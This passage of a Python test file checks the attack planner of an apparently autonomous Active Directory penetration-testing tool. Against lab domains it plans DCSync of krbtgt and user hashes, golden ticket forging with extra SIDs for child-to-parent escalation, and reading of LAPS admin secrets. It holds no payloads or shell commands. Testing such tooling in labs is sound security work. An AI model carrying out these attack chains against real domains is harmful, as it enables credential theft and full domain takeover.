    assert first.parameters["guid"] == "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    assert plan.steps[-1].operation == "ldap-acl-read"
    _assert_payload_agnostic_plan(plan)


def test_build_dcsync_krbtgt_execution_plan_is_drsuapi_primitive():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "dcsync-krbtgt")

    plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})

    assert plan.ok is True
    assert len(plan.steps) == 1
    step = plan.steps[0]
    assert step.operation == "drsuapi-dcsync"
    assert step.parameters == {
        "domain": "lab.local",
        "account": "krbtgt",
        "dc": "dc01.lab.local",
    }
    _assert_payload_agnostic_plan(plan)


def test_build_dcsync_account_execution_plan_is_drsuapi_primitive():
    action = capabilities.CapabilityAction(
        name="dcsync-account",
        target="domain=lab.local;account=alice",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["creds:alice@lab.local"],
        intent={"capability": "dcsync-account", "domain": "lab.local", "account": "alice"},
    )

    plan = capabilities.build_capability_execution_plan(action, {"dc": "dc01.lab.local"})

    assert plan.ok is True
    assert len(plan.steps) == 1
    step = plan.steps[0]
    assert step.operation == "drsuapi-dcsync"
    assert step.parameters == {
        "domain": "lab.local",
        "account": "alice",
        "dc": "dc01.lab.local",
    }
    _assert_payload_agnostic_plan(plan)


def test_build_dcsync_alias_defaults_to_krbtgt_and_supports_accounts():
    krbtgt_action = capabilities.CapabilityAction(
        name="dcsync",
        target="domain=lab.local",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["krbtgt-hash:lab.local"],
        intent={"capability": "dcsync", "domain": "lab.local"},
    )
    user_action = capabilities.CapabilityAction(
        name="dcsync",
        target="domain=lab.local;account=alice",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=["creds:alice@lab.local"],
        intent={"capability": "dcsync", "domain": "lab.local", "account": "alice"},
    )

    krbtgt_plan = capabilities.build_capability_execution_plan(krbtgt_action, {})
    user_plan = capabilities.build_capability_execution_plan(user_action, {})

    assert krbtgt_plan.ok is True
    assert krbtgt_plan.steps[0].operation == "drsuapi-dcsync"
    assert krbtgt_plan.steps[0].parameters == {"domain": "lab.local", "account": "krbtgt"}
    assert user_plan.ok is True
    assert user_plan.steps[0].operation == "drsuapi-dcsync"
    assert user_plan.steps[0].parameters == {"domain": "lab.local", "account": "alice"}
    assert capabilities.verify_capability("dcsync", {"krbtgt_hash_present": True}).verdict == "achieved"


def test_build_dcsync_account_requires_account():
    action = capabilities.CapabilityAction(
        name="dcsync-account",
        target="domain=lab.local",
        preconditions=["ds-replication-rights:lab.local", "live-foothold:*"],
        effects=[],
        intent={"capability": "dcsync-account", "domain": "lab.local"},
    )

    plan = capabilities.build_capability_execution_plan(action, {})

    assert plan.ok is False
    assert plan.missing == ["account"]


def test_build_account_kerberos_context_plan_uses_tgt_artifact_not_ptt():
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={
            "capability": "ensure-account-kerberos-context",
            "domain": "lab.local",
            "account": "alice",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "aes256": "a" * 64,
        "proof_host": "dc01.lab.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
        "kerberos-account-tgt",
        "kerberos-logon-session-create",
        "kerberos-ticket-import",
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
    ]
    tgt = plan.steps[2]
    assert tgt.parameters == {
        "domain": "lab.local",
        "user": "alice",
        "key_type": "aes256",
        "key": "a" * 64,
        "output_format": "base64-ticket",
        "nowrap": True,
    }
    assert plan.steps[-1].parameters["resource"] == "\\\\dc01.lab.local\\SYSVOL"
    _assert_payload_agnostic_plan(plan)


def test_build_account_kerberos_context_requires_key_material():
    action = capabilities.CapabilityAction(
        name="ensure-account-kerberos-context",
        target="domain=lab.local;account=alice;callback=13",
        preconditions=["creds:alice@lab.local", "live-callback:13"],
        effects=["kerberos-account-context:alice@lab.local@callback:13"],
        intent={"capability": "ensure-account-kerberos-context", "domain": "lab.local", "account": "alice"},
    )

    plan = capabilities.build_capability_execution_plan(action, {})

    assert plan.ok is False
    assert plan.missing == ["key"]


def test_verify_account_kerberos_context_requires_account_ticket_and_access():
    achieved = capabilities.verify_capability("ensure-account-kerberos-context", {
        "callback_id": "13",
        "account": "alice",
        "domain": "lab.local",
        "logon_context_proven": True,
        "account_ticket_present": True,
        "service_access_proven": True,
    })
    partial = capabilities.verify_capability("ensure-account-kerberos-context", {
        "callback_id": "13",
        "account": "alice",
        "domain": "lab.local",
        "logon_context_proven": True,
        "service_access_proven": True,
    })
    wrong_context = capabilities.verify_capability("ensure-account-kerberos-context", {
        "callback_id": "13",
        "account": "alice",
        "domain": "lab.local",
        "account_ticket_present": True,
        "service_access_proven": True,
    })

    assert achieved.verdict == "achieved"
    assert partial.verdict == "partial"
    assert wrong_context.verdict == "partial"


def test_build_forge_golden_ticket_execution_plan_is_kerberos_primitive():
    state = es.EngagementState(
        objective="domain admin",
        footholds=[_foothold("lab.local")],
        hops=[_hop("krbtgt-hash:lab.local")],
    )
    action = next(item for item in capabilities.actions_from_state(state) if item.name == "forge-golden-ticket")

    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.lab.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
        "kerberos-ticket-forge",
        "kerberos-logon-session-create",
        "kerberos-ticket-import",
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
    ]
    assert plan.steps[0].parameters["target_context"] == "current"
    assert plan.steps[1].parameters["requires_import"] is False
    assert plan.steps[1].parameters["resource"] == "\\\\dc01.lab.local\\C$"
    assert "service" not in plan.steps[1].parameters
    forge = plan.steps[2]
    assert forge.parameters == {
        "domain": "lab.local",
        "user": "Administrator",
        "domain_sid": "S-1-5-21-111-222-333",
        "key_type": "aes256",
        "key": "a" * 64,
        "inject": False,
        "output_format": "base64-ticket",
        "nowrap": True,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
    }
    assert forge.expected_probe == "extract_forged_ticket_artifact"
    assert plan.steps[3].parameters["netonly"] is True
    assert plan.steps[4].parameters["ticket_artifact"] == "{{kerberos_ticket_base64}}"
    assert "artifact:kerberos_ticket_base64" in plan.steps[4].prerequisites
    assert plan.steps[6].parameters["resource"] == "\\\\dc01.lab.local\\C$"
    assert plan.steps[6].parameters["store"] == "ticket-store-fork-run"
    assert "service" not in plan.steps[6].parameters
    assert "ticket:kerberos_ticket_imported" in plan.steps[6].prerequisites
    _assert_payload_agnostic_plan(plan)


def test_build_ensure_kerberos_context_plan_reuses_forge_builder_inputs():
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=root.local;callback=13;source_domain=child.root.local",
        preconditions=[
            "da:root.local",
            "krbtgt-hash:child.root.local",
            "live-callback:13",
        ],
        effects=["kerberos-context:root.local@callback:13"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": "root.local",
            "target_domain": "root.local",
            "source_domain": "child.root.local",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.root.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
        "kerberos-ticket-forge",
        "kerberos-logon-session-create",
        "kerberos-ticket-import",
        "kerberos-ticket-list",
        "kerberos-context-service-proof",
    ]
    assert {step.capability for step in plan.steps} == {"ensure-kerberos-context"}
    forge = plan.steps[2]
    assert forge.parameters["domain"] == "child.root.local"
    assert forge.parameters["target_domain"] == "root.local"
    assert forge.parameters["extra_sids"] == ["S-1-5-21-444-555-666-519"]
    assert plan.steps[1].parameters["target_context"] == "current"
    assert plan.steps[-1].parameters["resource"] == "\\\\dc01.root.local\\C$"
    # ensure-kerberos-context proves by service access even cross-domain — it must NOT divert into the
    # forge capability's inter-realm referral / parent-DCSync proof.
    operations = [step.operation for step in plan.steps]
    assert "kerberos-inter-realm-referral" not in operations
    assert "drsuapi-dcsync" not in operations
    _assert_payload_agnostic_plan(plan)


def test_forge_golden_ticket_cross_domain_plan_defaults_to_os_native_referral_acquisition_and_parent_dcsync():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )
    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.root.local",
        "child_dc": "dc01.child.root.local",
    })

    assert plan.ok is True
    operations = [step.operation for step in plan.steps]
    assert operations[2] == "kerberos-ticket-forge"
    assert "kerberos-inter-realm-referral" not in operations
    assert "kerberos-service-ticket-request" not in operations
    assert operations[-2] == "kerberos-service-ticket-acquire"
    assert operations[-1] == "drsuapi-dcsync"
    # No netonly logon fork on the cross-domain path — the forged child TGT loads into the current context and
    # Sage asks the operating system to acquire the parent LDAP ticket before DCSync authenticates.
    assert "kerberos-logon-session-create" not in operations
    assert plan.steps[3].parameters == {
        "domain": "root.local",
        "target_context": "current",
        "store": "agent-cache",
    }
    assert plan.steps[4].parameters == {
        "domain": "child.root.local",
        "ticket_artifact": "{{kerberos_ticket_base64}}",
        "target_context": "current",
        "store": "agent-cache",
    }
    assert plan.steps[5].parameters == {
        "domain": "root.local",
        "target_context": "current",
        "store": "agent-cache",
    }
    assert plan.steps[6].parameters == {
        "domain": "root.local",
        "service": "ldap/dc01.root.local",
        "target_context": "current",
        "store": "agent-cache",
    }
    assert plan.steps[6].prerequisites == ["ticket:kerberos_ticket_imported"]
    dcsync = plan.steps[-1]
    assert dcsync.parameters == {
        "domain": "root.local",
        "account": "krbtgt",
        "executor": "native",
        "dc": "dc01.root.local",
    }
    _assert_payload_agnostic_plan(plan)


def test_forge_golden_ticket_cross_domain_plan_can_opt_into_explicit_asktgs_fallback():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=child.root.local;target_domain=root.local",
        preconditions=["krbtgt-hash:child.root.local"],
        effects=["da:root.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "child.root.local",
            "target_domain": "root.local",
        },
    )
    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "extra_sids": ["S-1-5-21-444-555-666-519"],
        "proof_host": "dc01.root.local",
        "child_dc": "dc01.child.root.local",
        "kerberos_ticket_acquisition_strategy": "explicit-asktgs",
    })

    assert plan.ok is True
    operations = [step.operation for step in plan.steps]
    assert operations[3] == "kerberos-inter-realm-referral"
    assert operations[4] == "kerberos-service-ticket-request"
    assert "kerberos-service-ticket-acquire" not in operations
    referral = plan.steps[3]
    assert referral.parameters["service"] == "krbtgt/root.local"
    assert referral.parameters["child_dc"] == "dc01.child.root.local"
    service_ticket = plan.steps[4]
    assert service_ticket.parameters["service"] == "ldap/dc01.root.local"
    assert plan.steps[6].parameters["domain"] == "root.local"
    assert operations[-1] == "drsuapi-dcsync"
    _assert_payload_agnostic_plan(plan)


def test_forge_golden_ticket_same_domain_plan_has_no_referral_or_dcsync():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=root.local",
        preconditions=["krbtgt-hash:root.local"],
        effects=["da:root.local"],
        intent={"capability": "forge-golden-ticket", "domain": "root.local"},
    )
    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
        "proof_host": "dc01.root.local",
    })

    assert plan.ok is True
    operations = [step.operation for step in plan.steps]
    assert "kerberos-inter-realm-referral" not in operations
    assert "drsuapi-dcsync" not in operations
    # Same-domain forge keeps the isolated-context + service-proof path.
    assert "kerberos-logon-session-create" in operations
    assert operations[-1] == "kerberos-context-service-proof"
    _assert_payload_agnostic_plan(plan)


def test_build_ensure_kerberos_context_refresh_plan_purges_and_proves_current_context():
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=lab.local;callback=13",
        preconditions=["da:lab.local", "live-callback:13"],
        effects=["kerberos-context:lab.local@callback:13"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": "lab.local",
            "target_domain": "lab.local",
            "callback_id": "13",
            "refresh_current_context": True,
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "proof_host": "dc01.lab.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-ticket-purge",
        "kerberos-ticket-list",
        "kerberos-service-ticket-acquire",
        "kerberos-context-service-proof",
    ]
    assert {step.capability for step in plan.steps} == {"ensure-kerberos-context"}
    assert plan.steps[1].parameters == {
        "domain": "lab.local",
        "target_context": "current",
        "store": "current",
    }
    assert plan.steps[-2].parameters["resource"] == "\\\\dc01.lab.local\\C$"
    assert plan.steps[-1].parameters["requires_import"] is False
    assert plan.steps[-1].parameters["requires_acquisition"] is True
    assert plan.steps[-1].parameters["resource"] == "\\\\dc01.lab.local\\C$"
    assert "kerberos-ticket-forge" not in [step.operation for step in plan.steps]
    assert "kerberos-logon-session-create" not in [step.operation for step in plan.steps]
    _assert_payload_agnostic_plan(plan)


def test_build_ensure_kerberos_context_without_key_defaults_to_current_refresh():
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=lab.local;callback=13",
        preconditions=["da:lab.local", "live-callback:13"],
        effects=["kerberos-context:lab.local@callback:13"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": "lab.local",
            "callback_id": "13",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "proof_host": "dc01.lab.local",
    })

    assert plan.ok is True
    assert [step.operation for step in plan.steps] == [
        "kerberos-ticket-list",
        "kerberos-ticket-purge",
        "kerberos-ticket-list",
        "kerberos-service-ticket-acquire",
        "kerberos-context-service-proof",
    ]
    assert plan.steps[-2].parameters["resource"] == "\\\\dc01.lab.local\\C$"
    assert plan.steps[-1].parameters["resource"] == "\\\\dc01.lab.local\\C$"
    assert "key" not in plan.missing
    assert "kerberos-ticket-forge" not in [step.operation for step in plan.steps]


def test_build_forge_golden_ticket_service_proof_is_deferred_without_resource():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=lab.local",
        preconditions=["krbtgt-hash:lab.local"],
        effects=["da:lab.local"],
        intent={"capability": "forge-golden-ticket", "domain": "lab.local"},
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
    })

    assert plan.ok is True
    proof = plan.steps[-1]
    assert proof.operation == "kerberos-context-service-proof"
    assert proof.parameters["resource"] == "{{kerberos_service_resource}}"
    assert proof.expected_probe == "extract_ticket_probe"


def test_build_forge_golden_ticket_fails_closed_without_sid_or_key():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=lab.local",
        preconditions=["krbtgt-hash:lab.local"],
        effects=["da:lab.local"],
        intent={"capability": "forge-golden-ticket", "domain": "lab.local"},
    )

    plan = capabilities.build_capability_execution_plan(action)

    assert plan.ok is False
    assert plan.missing == ["domain_sid", "key"]


def test_build_parent_forge_requires_extra_sids():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local",
        preconditions=["krbtgt-hash:north.sevenkingdoms.local"],
        effects=["da:sevenkingdoms.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "north.sevenkingdoms.local",
            "target_domain": "sevenkingdoms.local",
        },
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "aes256": "a" * 64,
    })

    assert plan.ok is False
    assert plan.missing == ["extra_sids"]


def test_build_forge_golden_ticket_infers_generic_credential_key_type():
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=lab.local",
        preconditions=["krbtgt-hash:lab.local"],
        effects=["da:lab.local"],
        intent={"capability": "forge-golden-ticket", "domain": "lab.local"},
    )

    plan = capabilities.build_capability_execution_plan(action, {
        "domain_sid": "S-1-5-21-111-222-333",
        "credential": "c" * 64,
    })

    assert plan.ok is True
    assert plan.steps[2].parameters["key_type"] == "aes256"
    assert plan.steps[2].parameters["key"] == "c" * 64


def test_account_context_and_laps_fact_unlock_managed_secret_read():
    state = es.EngagementState(
        objective="read target managed local admin secret",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("kerberos-account-context:alice@lab.local@callback:13")],
        graph_facts=[
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "read-managed-local-admin-secret"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13"
    assert action.preconditions[0] == "kerberos-account-context:alice@lab.local@callback:13"
    assert action.effects == ["managed-local-admin-secret:ws01@child.lab.local"]
    assert action.intent["target_host"] == "ws01"


def test_graph_selected_laps_reader_unlocks_dcsync_account():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("ds-replication-rights:lab.local")],
        graph_facts=[
            _fact("credential-target:alice@lab.local"),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "dcsync-account"]

    assert len(actions) == 1
    action = actions[0]
    assert action.target == "domain=lab.local;account=alice"
    assert action.effects == ["creds:alice@lab.local"]
    assert "credential-target:alice@lab.local" in action.source_facts


def test_trusted_uncollected_objective_scope_suppresses_generic_account_harvest():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("krbtgt-hash:lab.local"),
            _hop("da:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
        ],
        graph_facts=[
            _fact("domain-collected:lab.local"),
            _fact("trust-reachable:lab.local:child.lab.local"),
            _fact("credential-target:alice@lab.local"),
            _fact("credential-target:bob@lab.local"),
        ],
    )

    assert capabilities.actions_from_state(state) == []


def test_trusted_uncollected_objective_scope_keeps_downstream_account_route():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("krbtgt-hash:lab.local"),
            _hop("da:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
        ],
        graph_facts=[
            _fact("domain-collected:lab.local"),
            _fact("trust-reachable:lab.local:child.lab.local"),
            _fact("credential-target:alice@lab.local"),
            _fact("credential-target:bob@lab.local"),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "dcsync-account"]

    assert [action.target for action in actions] == ["domain=lab.local;account=alice"]


def test_trusted_uncollected_objective_scope_keeps_explicit_account_target():
    state = es.EngagementState(
        objective=(
            "obtain administrative control of child.lab.local "
            "credential-target:alice@lab.local"
        ),
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("krbtgt-hash:lab.local"),
            _hop("da:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
        ],
        graph_facts=[
            _fact("domain-collected:lab.local"),
            _fact("trust-reachable:lab.local:child.lab.local"),
            _fact("credential-target:alice@lab.local"),
            _fact("credential-target:bob@lab.local"),
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "dcsync-account"]

    assert [action.target for action in actions] == ["domain=lab.local;account=alice"]


def test_downstream_account_edge_suppresses_sibling_dcsync_targets():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("ds-replication-rights:lab.local")],
        graph_facts=[
            _fact("credential-target:alice@lab.local"),
            _fact("credential-target:bob@lab.local"),
            _fact("credential-target:carol@lab.local"),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "dcsync-account"]

    assert [action.target for action in actions] == ["domain=lab.local;account=alice"]


def test_downstream_account_edge_suppresses_sibling_account_contexts():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("creds:alice@lab.local"),
            _hop("creds:bob@lab.local"),
            _hop("creds:carol@lab.local"),
        ],
        graph_facts=[
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "ensure-account-kerberos-context"
    ]

    assert [action.target for action in actions] == ["domain=lab.local;account=alice;callback=13"]


def test_equivalent_downstream_routes_advance_one_account_end_to_end():
    route_facts = [
        _fact("credential-target:alice@lab.local"),
        _fact("credential-target:bob@lab.local"),
        _fact(
            "can-read-managed-local-admin-secret:"
            "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
        _fact(
            "can-read-managed-local-admin-secret:"
            "account=bob;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
    ]
    base_hops = [
        _hop("ds-replication-rights:lab.local"),
        _hop("kerberos-context:lab.local@callback:13"),
    ]

    before_creds = es.EngagementState(
        objective=(
            "obtain administrative control of child.lab.local "
            "can-read-managed-local-admin-secret:"
            "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=base_hops,
        graph_facts=route_facts,
    )
    after_creds = es.EngagementState(
        objective=before_creds.objective,
        footholds=before_creds.footholds,
        hops=[*base_hops, _hop("creds:alice@lab.local")],
        graph_facts=route_facts,
    )
    after_context = es.EngagementState(
        objective=before_creds.objective,
        footholds=before_creds.footholds,
        hops=[
            *base_hops,
            _hop("creds:alice@lab.local"),
            _hop("kerberos-account-context:alice@lab.local@callback:13"),
        ],
        graph_facts=route_facts,
    )

    assert [
        action.target
        for action in capabilities.actions_from_state(before_creds)
        if action.name == "dcsync-account"
    ] == ["domain=lab.local;account=alice"]
    after_creds_actions = capabilities.actions_from_state(after_creds)
    assert not any(action.name == "dcsync-account" for action in after_creds_actions)
    assert [
        action.target
        for action in after_creds_actions
        if action.name == "ensure-account-kerberos-context"
    ] == ["domain=lab.local;account=alice;callback=13"]
    after_context_actions = capabilities.actions_from_state(after_context)
    assert not any(
        action.name in {"dcsync-account", "ensure-account-kerberos-context"}
        for action in after_context_actions
    )
    assert [
        action.target
        for action in after_context_actions
        if action.name == "read-managed-local-admin-secret"
    ] == [
        "account=alice;account_domain=lab.local;target=ws01;"
        "target_domain=child.lab.local;callback=13"
    ]


def test_equivalent_downstream_route_falls_back_after_selected_credential_failure():
    state = es.EngagementState(
        objective=(
            "obtain administrative control of child.lab.local "
            "can-read-managed-local-admin-secret:"
            "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
            _failed_hop("creds:alice@lab.local"),
        ],
        graph_facts=[
            _fact("credential-target:alice@lab.local"),
            _fact("credential-target:bob@lab.local"),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=bob;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "dcsync-account"
    ]

    assert [action.target for action in actions] == ["domain=lab.local;account=bob"]


def test_equivalent_downstream_route_falls_back_after_selected_context_failure():
    state = es.EngagementState(
        objective=(
            "obtain administrative control of child.lab.local "
            "can-read-managed-local-admin-secret:"
            "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
            _hop("creds:alice@lab.local"),
            _failed_hop("kerberos-account-context:alice@lab.local@callback:13"),
        ],
        graph_facts=[
            _fact("credential-target:alice@lab.local"),
            _fact("credential-target:bob@lab.local"),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=bob;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert not any(
        action.name == "ensure-account-kerberos-context"
        and "account=alice" in action.target
        for action in actions
    )
    assert [
        action.target
        for action in actions
        if action.name == "dcsync-account"
    ] == ["domain=lab.local;account=bob"]


def test_downstream_account_edge_allows_context_after_domain_control_material():
    state = es.EngagementState(
        objective="obtain administrative control of child.lab.local",
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[
            _hop("da:lab.local"),
            _hop("krbtgt-hash:lab.local"),
            _hop("kerberos-context:lab.local@callback:13"),
            _hop("creds:alice@lab.local"),
            _hop("creds:bob@lab.local"),
        ],
        graph_facts=[
            _fact(
                "can-read-managed-local-admin-secret:"
                "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
            ),
        ],
    )

    actions = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "ensure-account-kerberos-context"
    ]

    assert [action.target for action in actions] == ["domain=lab.local;account=alice;callback=13"]


def test_failed_account_dcsync_suppresses_same_account_retry():
    state = es.EngagementState(
        objective="obtain administrative control of essos.local",
        footholds=[_foothold("sevenkingdoms.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:sevenkingdoms.local"),
            _hop("kerberos-context:sevenkingdoms.local@callback:13"),
            _failed_hop("creds:guest@sevenkingdoms.local"),
        ],
        graph_facts=[_fact("credential-target:guest@sevenkingdoms.local")],
    )

    actions = capabilities.actions_from_state(state)

    assert not any(
        action.name == "dcsync-account"
        and action.target == "domain=sevenkingdoms.local;account=guest"
        for action in actions
    )


def test_non_admin_credential_material_preempts_sibling_account_harvesting():
    state = es.EngagementState(
        objective="obtain administrative control of essos.local",
        footholds=[_foothold("sevenkingdoms.local", callback_id="13")],
        hops=[
            _hop("ds-replication-rights:sevenkingdoms.local"),
            _hop("da:sevenkingdoms.local"),
            _hop("kerberos-context:sevenkingdoms.local@callback:13"),
            _hop("krbtgt-hash:sevenkingdoms.local"),
            _hop(r"creds:sevenkingdoms\cersei.lannister@sevenkingdoms.local"),
            _failed_hop("creds:guest@sevenkingdoms.local"),
        ],
        graph_facts=[
            _fact("credential-target:guest@sevenkingdoms.local"),
            _fact("credential-target:jaime.lannister@sevenkingdoms.local"),
            _fact("credential-target:cersei.lannister@sevenkingdoms.local"),
        ],
    )

    actions = capabilities.actions_from_state(state)

    assert not any(action.name == "dcsync-account" for action in actions)
    assert not any(action.name == "ensure-account-kerberos-context" for action in actions)


def test_structured_guidance_facts_unlock_dcsync_account_without_graph_fact():
    state = es.EngagementState(
        objective=(
            "obtain administrative control of child.lab.local "
            "credential-target:alice@lab.local "
            "can-read-managed-local-admin-secret:"
            "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("ds-replication-rights:lab.local")],
    )

    actions = [action for action in capabilities.actions_from_state(state) if action.name == "dcsync-account"]

    assert len(actions) == 1
    assert actions[0].target == "domain=lab.local;account=alice"


def test_structured_guidance_laps_fact_unlocks_read_without_graph_fact():
    state = es.EngagementState(
        objective=(
            "obtain administrative control of child.lab.local "
            "can-read-managed-local-admin-secret:"
            "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local"
        ),
        footholds=[_foothold("lab.local", callback_id="13")],
        hops=[_hop("kerberos-account-context:alice@lab.local@callback:13")],
    )

    actions = [
        action
        for action in capabilities.actions_from_state(state)
        if action.name == "read-managed-local-admin-secret"
    ]

    assert len(actions) == 1
    assert actions[0].target == (
        "account=alice;account_domain=lab.local;target=ws01;target_domain=child.lab.local;callback=13"
    )


def test_downstream_edge_suppresses_unneeded_admin_account_contexts():
    state = es.EngagementState(
        objective=(
            "obtain administrative control of essos.local "
            "can-read-managed-local-admin-secret:"
            "account=cersei.lannister;account_domain=sevenkingdoms.local;"
            "target=braavos;target_domain=essos.local"
        ),
        footholds=[_foothold("north.sevenkingdoms.local", callback_id="3")],
        hops=[
